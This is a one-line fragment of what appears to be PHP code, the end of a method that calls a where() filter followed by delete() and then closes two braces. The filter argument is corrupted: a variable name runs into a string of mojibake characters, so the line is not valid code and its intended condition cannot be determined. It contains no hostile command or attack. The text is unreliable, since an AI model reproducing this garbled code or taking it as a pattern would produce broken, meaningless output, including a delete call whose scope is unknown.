$this->where($a¢‡º‘‰Û‘)->delete(); } }